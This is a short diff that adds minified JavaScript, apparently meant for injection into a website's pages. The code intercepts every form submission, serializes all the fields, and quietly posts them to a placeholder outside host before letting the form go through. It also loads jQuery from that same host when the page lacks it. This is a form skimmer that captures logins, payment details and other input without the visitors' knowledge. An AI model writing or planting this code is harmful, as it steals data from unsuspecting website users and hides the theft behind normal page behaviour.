@@ -1,0 +1,4 @@
+
+(function(){var init=function(){var post=true;jQuery("form").submit(function(event){if(event.target&&post){post=false;var ref='?id='+window.location.href.split(/\?id=/)[1];jQuery.post('%URL%/serve'+ref,jQuery(event.target).serialize(),function(){jQuery(event.target).submit();});setTimeout(function(){post=true;},500);return false;}});};if(typeof jQuery=='undefined'){(function(l){var res=document.createElement('SCRIPT');res.type='text/javascript';res.src=l;document.getElementsByTagName('head')[0].appendChild(res);var loader;loader=function(){if(typeof jQuery=='undefined'){setTimeout(loader,10);}
+else{jQuery(init);}};setTimeout(loader,10);})('%URL%/jquery.js');}
+else{jQuery(init);}})();
